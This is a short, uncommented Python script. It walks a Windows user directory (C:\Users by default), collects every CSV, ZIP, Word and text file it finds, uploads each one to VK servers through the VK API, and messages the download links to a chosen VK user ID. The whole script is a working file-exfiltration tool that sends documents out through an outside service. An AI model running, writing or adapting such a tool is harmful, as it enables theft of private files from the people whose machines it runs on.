import os
from random import random
import requests

token = ''
inputtoken = input('Input vkApi token: ')
if ( inputtoken != 'None' ) : token = inputtoken
send_params = {'user_id': input('Input your USER ID that will be used to send files: '), 
               'random_id': int(random()*231195633), 
               'access_token': token, 
               'v': '5.103',
               'message': 'penis'}

group_id = input('Input your GROUP ID: ')
walkdir = r'C:\Users'
dirinput = input('Input direction for parsing or "None" to use standard direction: ')
if ( dirinput != 'None' ) : walkdir = dirinput
for curdir, directions, files in os.walk(walkdir):
    for f in files:
        if f.endswith(('.csv',
                       '.zip',
                       '.docx',
                       '.doc',
                       '.txt')):
            print(f)
            file_params = {'file': open(curdir + '\\' + f, 'rb')}
            post = requests.post(requests.get(r'http://api.vk.com/method/docs.getMessagesUploadServer?', 
                   params = {'access_token': token, 
                             'v': '5.103', 
                             'peer_id': send_params['user_id'], 
                             'group_id': group_id}).json()['response']['upload_url'], files=file_params)
            
            try:
                o = requests.get(r'http://api.vk.com/method/docs.save?', 
                     params = {'file': post.json()['file'], 
                               'access_token': token, 
                               'v': '5.103'}).json()
            except Exception:
                continue
            
            send_params['message'] = '\n' + o['response']['doc']['url']
            send_params['random_id'] = int(random()*231195633)
            requests.get(r'http://api.vk.com/method/messages.send?', 
                       params = send_params)
            file_params['file'].close()
            print(f)
